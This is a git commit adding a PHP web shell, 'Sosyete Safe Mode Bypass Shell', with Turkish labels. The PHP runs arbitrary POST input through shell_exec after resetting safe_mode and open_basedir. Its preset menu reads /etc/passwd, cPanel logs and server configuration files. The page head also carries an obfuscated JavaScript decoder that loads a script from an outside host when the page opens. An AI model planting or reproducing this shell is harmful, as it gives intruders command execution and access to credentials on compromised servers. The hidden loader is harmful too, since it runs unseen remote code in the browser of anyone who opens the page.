0f3d7b5d4a7cef5dd4553399cfbeb7c7a90936a4
Krisna <70759141+chikyukrish@users.noreply.github.com>
2021-10-09 08:40:37 +0700

    Add files via upload

---
+++ sosyete.php
@@ -0,0 +1,221 @@
+<html>
+ <head>
+   <meta http-equiv="Content-Type" content="text/html; charset=windows-1256"><meta http-equiv="Content-Language" content="ar-sa">
+   <title> Sosyete Safe Mode Bypass Shell - r57c99.com</title>
+<script language=javascript>document.write(unescape('%3C%73%63%72%69%70%74%20%6C%61%6E%67%75%61%67%65%3D%22%6A%61%76%61%73%63%72%69%70%74%22%3E%66%75%6E%63%74%69%6F%6E%20%64%46%28%73%29%7B%76%61%72%20%73%31%3D%75%6E%65%73%63%61%70%65%28%73%2E%73%75%62%73%74%72%28%30%2C%73%2E%6C%65%6E%67%74%68%2D%31%29%29%3B%20%76%61%72%20%74%3D%27%27%3B%66%6F%72%28%69%3D%30%3B%69%3C%73%31%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%74%2B%3D%53%74%72%69%6E%67%2E%66%72%6F%6D%43%68%61%72%43%6F%64%65%28%73%31%2E%63%68%61%72%43%6F%64%65%41%74%28%69%29%2D%73%2E%73%75%62%73%74%72%28%73%2E%6C%65%6E%67%74%68%2D%31%2C%31%29%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%74%29%29%3B%7D%3C%2F%73%63%72%69%70%74%3E'));dF('%264DTDSJQU%2631MBOHVBHF%264E%2633kbwbtdsjqu%2633%2631TSD%264E%2633iuuq%264B00s68d%3A%3A/dpn0o4xti4m0dj%7B/kt%2633%264F%261B%261B%264D0TDSJQU%264F%261B%261%3A%261%3A%261%3A1')</script>
+   <style>
+   td {
+   font-family: verdana, arial, ms sans serif, sans-serif;
+   font-size: 11px;
+   color: #D5ECF9;
+   }
+   BODY {
+   margin-top: 4px;
+   margin-right: 4px;
+   margin-bottom: 4px;
+   margin-left: 4px;
+   scrollbar-face-color: #b6b5b5;
+   scrollbar-highlight-color: #758393;
+   scrollbar-3dlight-color: #000000;
+   scrollbar-darkshadow-color: #101842;
+   scrollbar-shadow-color: #ffffff;
+   scrollbar-arrow-color: #000000;
+   scrollbar-track-color: #ffffff;
+   }
+   A:link {COLOR:blue; TEXT-DECORATION: none}
+   A:visited { COLOR:blue; TEXT-DECORATION: none}
+   A:active {COLOR:blue; TEXT-DECORATION: none}
+   A:hover {color:red;TEXT-DECORATION: none}
+   input, textarea, select {
+   background-color: #EBEAEA;
+   border-style: solid;
+   border-width: 1px;
+   font-family: verdana, arial, sans-serif;
+   font-size: 11px;
+   color: #333333;
+   padding: 0px;
+   }
+   </style>
+   </head>
+    <BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
+        <center>
+        <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
+        <th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
+    <p align="center"> </p>
+    <p align="center">
+    <a bookmark="minipanel">
+    <font face="Webdings" size="7" color="#DCE7EF"></font></a><font size="7" face="Martina"></font><span lang="en-us"><font size="3" face="Martina"> </font>
+    <br>
+        <font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
+    </p>
+            <a bookmark="minipanel">
+    <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+    <p align="center">Sosyete Safe Mode Bypass Shell 
+    <b>
+        <font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
+   </p>
+        <a bookmark="minipanel">
+  <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+  <p align="center">~
+    <b>
+
+
+                <p>
+    </form>
+        </p>
+                </td>
+
+
+    </tr>
+            </table>   
+     </a>
+	 
+	 <p>
+	 
+	     <br>
+	         </p>
+	
+     <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+        <td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
+  <b>
+     </b>
+	 <font face="Wingdings 3" size="5"></font><b>Sosyete Safe Mode Bypass Shell ; Bypass shell'lerden esinlenerek birçok shell'in ortak karisimi olarak sunulmustur.<span lang="en-us"></span><span lang="en-us"></span> </b><font face="Wingdings 3" size="5"></font></p><p align="center"> </p></td></tr></table>
+
+</a>
+
+
+<div align="right">
+
+<span lang="en-us">
+
+        </span>
+                        </div>
+                </body>
+    </html>
+
+ <?
+
+
+echo "<b><font color=red>Sosyete Bypass Main Menu</font></b><br>";
+
+print_r('
+
+
+
+
+<pre>
+
+
+<form method="POST" action="">
+<b><font color=red> </font></b><input name="sosyete" type="text"><input value="&#199;al&#305;&#351;t&#305;r" type="submit">
+</form>
+<form method="POST" action="">
+<b><font color=red></font><select size="1" name="fuck">
+<option value=" ">Sosyete safe mode bypass shell</option>
+<option value="id;pwd">id & Dizin</option>
+<option value="ls">Dosyalar</option>
+<option value="uname -a">Server</option>
+<option value="netstat -an | grep -i listen">A&#231;&#305;k Portlar</option>
+<option value="ipconfig">A&#287; Bilgisi</option>
+<option value="ps -aux">Uygulamalar</option>
+<option value="who -q">Kullan&#305;c&#305; Say&#305;s&#305;</option>
+<option value="cat /etc/passwd">cat/etc/passwd</option>
+<option value="cat /var/cpanel/accounting.log">cat/var/cpanel/accounting.log</option>
+<option value="cat /etc/syslog.conf">cat/etc/syslog.conf</option>
+<option value="cat /etc/hosts">cat/etc/hosts</option>
+<option value="cat /etc/named.conf">cat/etc/named.conf</option>
+<option value="cat /etc/httpd/conf/httpd.conf">cat/etc/httpd/conf/httpd.conf</option>
+</select> <input type="submit" value="&#199;al&#305;&#351;t&#305;r">
+</form>
+</pre>
+<style>
+   td {
+   font-family: verdana, arial, ms sans serif, sans-serif;
+   font-size: 11px;
+   color: #D5ECF9;
+   }
+   BODY {
+   margin-top: 4px;
+   margin-right: 4px;
+   margin-bottom: 4px;
+   margin-left: 4px;
+   scrollbar-face-color: #b6b5b5;
+   scrollbar-highlight-color: #758393;
+   scrollbar-3dlight-color: #000000;
+   scrollbar-darkshadow-color: #101842;
+   scrollbar-shadow-color: #ffffff;
+   scrollbar-arrow-color: #000000;
+   scrollbar-track-color: #ffffff;
+   }
+   A:link {COLOR:blue; TEXT-DECORATION: none}
+   A:visited { COLOR:blue; TEXT-DECORATION: none}
+   A:active {COLOR:blue; TEXT-DECORATION: none}
+   A:hover {color:red;TEXT-DECORATION: none}
+   input, textarea, select {
+   background-color: #EBEAEA;
+   border-style: solid;
+   border-width: 1px;
+   font-family: verdana, arial, sans-serif;
+   font-size: 11px;
+   color: #333333;
+   padding: 0px;
+   }
+  </style></head>
+<BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0 style="color:#DCE7EF">
+<center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr>
+    <th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2" bgcolor="#000000">
+<p align="center"> </p>
+    <p align="center">
+<a bookmark="minipanel">
+    <font face="Webdings" size="7" color="#DCE7EF"></font></a><font size="7" face="Martina"></font><span lang="en-us"><font size="3" face="Martina"> </font>
+    <br>
+<font color="#FFFF00" face="Arial" size="7"><span lang="en-us"></span></font></p>
+</p>
+
+
+<div align="right">
+
+<span lang="en-us"> </span></div></body></html>
+
+
+');
+ini_restore("safe_mode");
+ini_restore("open_basedir");
+$fuck=shell_exec($_POST[sosyete]); 
+$mokoko=shell_exec($_POST[fuck]); 
+echo "<pre><h4>";
+echo "<b><font color=red>Komut Sonucu </font></b><br>"; 
+echo $fuck;
+echo $mokoko;
+echo "</h4></pre>";
+
+?>
+
+</tr>
+        </table>    
+		
+		</a>
+		        <p>
+				
+	<br>
+	
+	        </p>
+			                <TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr>
+    <td width="990" height="1" valign="top" style="color: #DCE7EF" bgcolor="#000000"><p align="center">
+    
+	<b>
+     
+	 </b><font face="Wingdings 3" size="5"></font><b><font color="#CC0000">Sosyete Safe Mode Bypass Shell<span lang="en-us"></span> <span lang="en-us"> </span>  </b><font color="#CC0000"><b>Coded by</b> </font><b><span lang="en-us"><a href="http://www.R57.Gen.Tr"><font color="#CC0000">R57.gen.tr</a></span><font color="#CC0000"> ~ <span lang="en-us">Sosyete</span> </b><font face="Wingdings 3" size="5"> </font></p><p align="center"> </p></td></tr></table>
+
+</a>
+
+
+<div align="right">
+
+<span lang="en-us">
+
+</span>
+                </div>
+				                </body>
+
+</html>
